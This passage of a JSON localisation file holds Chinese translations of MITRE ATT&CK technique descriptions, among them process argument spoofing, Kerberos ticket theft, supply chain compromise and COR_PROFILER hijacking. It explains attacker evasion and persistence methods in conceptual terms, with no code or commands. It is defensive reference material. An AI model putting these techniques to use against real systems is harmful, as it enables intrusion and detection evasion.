    "Process Argument Spoofing": {
        "translated_name": "进程参数欺骗",
        "translated_description": "对手可能尝试通过覆盖进程内存来隐藏进程命令行参数。进程命令行参数存储在进程环境块（PEB）中，这是Windows用于存储有关/用于进程的各种信息的数据结构。PEB包括在执行进程时引用的进程命令行参数。当创建进程时，监控进程创建的防御工具/传感器可能从PEB中检索进程参数。(引用: Microsoft PEB 2021)(引用: Xpn Argue Like Cobalt 2019)\n\n对手可能操纵进程PEB以规避防御。例如，可以滥用[进程空洞](https://attack.mitre.org/techniques/T1055/012)在挂起状态下生成带有良性参数的进程。在生成进程并初始化PEB（并且工具/传感器可能记录进程信息）后，对手可能覆盖PEB以修改命令行参数（例如使用[本机API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code>函数），然后恢复带有恶意参数的进程执行。(引用: Cobalt Strike Arguments 2019)(引用: Xpn Argue Like Cobalt 2019)(引用: Nviso Spoof Command Line 2020)\n\n对手还可能执行带有恶意命令行参数的进程，然后使用良性参数修补内存，以绕过后续的进程内存分析。(引用: FireEye FiveHands April 2021)\n\n此行为还可能与其他技巧（如[父PID欺骗](https://attack.mitre.org/techniques/T1134/004)）结合使用，以操纵或进一步规避基于进程的检测。"
    },
    "Exfiltration Over Web Service": {
        "translated_name": "通过Web服务外泄",
        "translated_description": "对手可能使用现有的合法外部Web服务来外泄数据，而不是他们的主要命令和控制通道。作为外泄机制的流行Web服务可能提供大量掩护，因为网络中的主机在被攻破之前可能已经在与它们通信。防火墙规则也可能已经存在，以允许这些服务的流量。\n\nWeb服务提供商通常也使用SSL/TLS加密，为对手提供了额外的保护。"
    },
    "Remote Access Software": {
        "translated_name": "远程访问软件",
        "translated_description": "对手可能使用合法的桌面支持和远程访问软件在网络内的目标系统上建立交互式命令和控制通道。这些服务，如`VNC`、`Team Viewer`、`AnyDesk`、`ScreenConnect`、`LogMein`、`AmmyyAdmin`和其他远程监控和管理（RMM）工具，通常作为合法的技术支持软件使用，并且可能被目标环境中的应用程序控制允许。(引用: Symantec Living off the Land)(引用: CrowdStrike 2015 Global Threat Report)(引用: CrySyS Blog TeamSpy)\n\n远程访问软件可能在攻破后安装并用作备用通信通道，以实现冗余访问或作为与目标系统建立交互式远程桌面会话的一种方式。它们也可能作为恶意软件的一部分，用于建立反向连接或反向连接到服务或对手控制的系统。\n \n对手可能类似地滥用EDR和其他防御工具中包含的响应功能，这些功能启用远程访问。\n\n许多远程访问软件的安装也可能包括持久性（例如，软件的安装例程创建一个[Windows服务](https://attack.mitre.org/techniques/T1543/003)）。远程访问模块/功能也可能作为现有软件的一部分存在（例如，Google Chrome的远程桌面）。(引用: Google Chrome Remote Desktop)(引用: Chrome Remote Desktop)"
    },
    "Steal or Forge Kerberos Tickets": {
        "translated_name": "窃取或伪造Kerberos票证",
        "translated_description": "对手可能尝试通过窃取或伪造Kerberos票证来颠覆Kerberos认证，以启用[传递票证](https://attack.mitre.org/techniques/T1550/003)。Kerberos是一种在现代Windows域环境中广泛使用的认证协议。在Kerberos环境中，称为“领域”，有三个基本参与者：客户端、服务和密钥分发中心（KDC）。(引用: ADSecurity Kerberos Ring Decoder) 客户端请求访问服务，并通过来自KDC的Kerberos票证交换，在成功认证后获得访问权限。KDC负责认证和票证授予。对手可能尝试通过窃取票证或伪造票证来滥用Kerberos，以启用未经授权的访问。\n\n在Windows上，内置的<code>klist</code>实用程序可用于列出和分析缓存的Kerberos票证。(引用: Microsoft Klist)\n"
    },
    "Credentials from Password Stores": {
        "translated_name": "从密码存储中获取凭据",
        "translated_description": "对手可能会搜索常见的密码存储位置以获取用户凭据。(引用: F-Secure The Dukes) 根据操作系统或持有凭据的应用程序，密码存储在系统的多个位置。还有一些特定的应用程序和服务存储密码，以便用户更容易管理和维护，例如密码管理器和云秘密库。一旦获得凭据，它们可以用于横向移动和访问受限信息。"
    },
    "Supply Chain Compromise": {
        "translated_name": "供应链妥协",
        "translated_description": "对手可能在最终消费者收到产品之前操纵产品或产品交付机制，以实现数据或系统妥协。\n\n供应链妥协可以发生在供应链的任何阶段，包括：\n\n* 操纵开发工具\n* 操纵开发环境\n* 操纵源代码库（公共或私有）\n* 操纵开源依赖项中的源代码\n* 操纵软件更新/分发机制\n* 受感染的系统镜像（多个案例中在工厂感染的可移动媒体）(引用: IBM Storwize)(引用: Schneider Electric USB Malware) \n* 用修改版本替换合法软件\n* 向合法分销商销售修改/伪造产品\n* 拦截运输\n\n虽然供应链妥协可以影响硬件或软件的任何组件，但对手希望获得执行权限时，通常会专注于在软件分发或更新渠道中添加恶意内容。(引用: Avast CCleaner3 2018)(引用: Microsoft Dofoil 2018)(引用: Command Five SK 2011) 目标可能是特定的受害者集，或者恶意软件可能分发给广泛的消费者，但仅在特定受害者上继续进行其他战术。(引用: Symantec Elderwood Sept 2012)(引用: Avast CCleaner3 2018)(引用: Command Five SK 2011) 作为许多应用程序依赖项使用的流行开源项目也可能成为目标，以便向依赖项的用户添加恶意代码。(引用: Trendmicro NPM Compromise)"
    },
    "Exploit Public-Facing Application": {
        "translated_name": "利用面向公众的应用程序",
        "translated_description": "对手可能尝试利用互联网面向主机或系统中的弱点以初始访问网络。系统中的弱点可能是软件漏洞、临时故障或配置错误。\n\n被利用的应用程序通常是网站/网络服务器，但也可以包括数据库（如SQL）、标准服务（如SMB或SSH）、网络设备管理和管理协议（如SNMP和Smart Install）以及任何其他具有互联网可访问开放套接字的系统。(引用: NVD CVE-2016-6662)(引用: CIS Multiple SMB Vulnerabilities)(引用: US-CERT TA18-106A Network Infrastructure Devices 2018)(引用: Cisco Blog Legacy Device Attacks)(引用: NVD CVE-2014-7169) 根据被利用的漏洞，这也可能涉及[利用漏洞进行防御规避](https://attack.mitre.org/techniques/T1211)或[利用客户端执行漏洞](https://attack.mitre.org/techniques/T1203)。\n\n如果应用程序托管在基于云的基础设施和/或容器化环境中，那么利用它可能导致底层实例或容器的妥协。这可以为对手提供访问云或容器API的路径（例如，通过[云实例元数据API](https://attack.mitre.org/techniques/T1552/005)），通过[逃逸到主机](https://attack.mitre.org/techniques/T1611)利用容器主机访问，或利用弱身份和访问管理策略。\n\n对手还可能利用边缘网络基础设施和相关设备，特别是那些不支持强大主机防御的设备。(引用: Mandiant Fortinet Zero Day)(引用: Wired Russia Cyberwar)\n\n对于网站和数据库，OWASP前10名和CWE前25名突出了最常见的基于Web的漏洞。(引用: OWASP Top 10)(引用: CWE top 25)"
    },
    "COR_PROFILER": {
        "translated_name": "COR_PROFILER",
        "translated_description": "对手可能利用COR_PROFILER环境变量劫持加载.NET CLR的程序的执行流。COR_PROFILER是一个.NET框架功能，允许开发人员指定一个非托管（或.NET外部）分析DLL加载到每个加载公共语言运行时（CLR）的.NET进程中。这些分析器旨在监视、排除故障和调试由.NET CLR执行的托管代码。(引用: Microsoft Profiling Mar 2017)(引用: Microsoft COR_PROFILER Feb 2013)\n\nCOR_PROFILER环境变量可以在各种范围内设置（系统、用户或进程），导致不同级别的影响。系统和用户范围的环境变量范围在注册表中指定，其中可以将[组件对象模型](https://attack.mitre.org/techniques/T1559/001)（COM）对象注册为分析DLL。还可以在内存中创建进程范围的COR_PROFILER，而无需修改注册表。从.NET框架4开始，只要在COR_PROFILER_PATH环境变量中指定DLL的位置，就不需要注册分析DLL。(引用: Microsoft COR_PROFILER Feb 2013)\n\n对手可能滥用COR_PROFILER建立持久性，每次调用CLR时在所有.NET进程的上下文中执行恶意DLL。如果受害者.NET进程以更高权限级别执行，COR_PROFILER还可以用于提升权限（例如[绕过用户帐户控制](https://attack.mitre.org/techniques/T1548/002)），以及挂钩和[削弱防御](https://attack.mitre.org/techniques/T1562)由.NET进程提供。(引用: RedCanary Mockingbird May 2020)(引用: Red Canary COR_PROFILER May 2020)(引用: Almond COR_PROFILER Apr 2019)(引用: GitHub OmerYa Invisi-Shell)(引用: subTee .NET Profilers May 2017)"
    }
}
